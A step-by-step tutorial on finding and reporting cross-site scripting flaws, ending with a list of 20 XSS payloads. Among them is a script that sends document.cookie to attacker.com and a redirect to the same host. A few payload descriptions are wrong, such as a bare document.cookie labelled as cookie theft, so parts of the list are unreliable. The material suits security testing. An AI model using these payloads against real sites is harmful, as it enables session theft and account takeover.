Step-by-Step Guide to Testing XSS Vulnerabilities

Cross-Site Scripting (XSS) is a critical vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This guide will walk you through testing for XSS vulnerabilities, including tools, techniques, and resources.

What is XSS?

XSS occurs when an application allows user-supplied input to be executed as JavaScript in the browser. Attackers can exploit this to:

  • Steal sensitive data (e.g., cookies, session tokens).
  • Perform actions on behalf of the user.
  • Deface websites.
  • Redirect users to malicious sites.

Types of XSS

  • Reflected XSS: The injected script is reflected off a web server, such as in search results or error messages.
  • Stored XSS: The injected script is permanently stored on the server, such as in a database or comment section.
  • DOM-based XSS: The vulnerability exists in the client-side code (JavaScript) rather than the server.

Step-by-Step Testing Guide

Step 1: Identify XSS Entry Points

Look for features or parameters that accept user input. Examples include:

  • Search bars.
  • Comment sections.
  • Form inputs (e.g., name, email, password).
  • URL parameters.

Step 2: Test for XSS Vulnerabilities

Here’s how to test for XSS vulnerabilities:

  • Basic XSS Testing: Inject simple scripts like <script>alert(1)</script>.
  • Bypass Filters: Use encoding or obfuscation to bypass input filters.
  • Test for DOM-based XSS: Check if user input is used in JavaScript functions like eval() or innerHTML.

Step 3: Exploit XSS Vulnerabilities

Once you’ve identified an XSS vulnerability, you can:

  • Steal cookies using document.cookie.
  • Redirect users to malicious sites using window.location.
  • Perform actions on behalf of the user (e.g., change passwords).

Step 4: Report the Vulnerability

Document the issue, provide a Proof of Concept (PoC), and suggest mitigations like input validation and output encoding.

Example Payloads

Here are 20 example payloads to test for XSS:

  • <script>alert(1)</script> - Basic XSS payload.
  • <img src=x onerror=alert(1)> - XSS using image tag.
  • <svg/onload=alert(1)> - XSS using SVG tag.
  • <body onload=alert(1)> - XSS using body tag.
  • <a href="javascript:alert(1)">Click Me</a> - XSS using JavaScript in href.
  • <iframe src="javascript:alert(1)"> - XSS using iframe.
  • <input type="text" value="<script>alert(1)</script>"> - XSS in input field.
  • <textarea><script>alert(1)</script></textarea> - XSS in textarea.
  • <div onmouseover=alert(1)>Hover Me</div> - XSS using mouseover event.
  • <script>document.cookie</script> - Steal cookies.
  • <script>window.location="http://attacker.com"</script> - Redirect to malicious site.
  • <script>alert(document.domain)</script> - Show domain name.
  • <script>alert(window.location)</script> - Show current URL.
  • <script>alert(navigator.userAgent)</script> - Show user agent.
  • <script>alert(document.cookie)</script> - Show cookies.
  • <script>fetch("http://attacker.com?cookie="+document.cookie)</script> - Send cookies to attacker.
  • <script>document.body.innerHTML="Hacked"</script> - Deface website.
  • <script>document.write("Hacked")</script> - Overwrite page content.
  • <script>alert("XSS")</script> - Simple alert box.
  • <script>console.log("XSS")</script> - Log message to console.
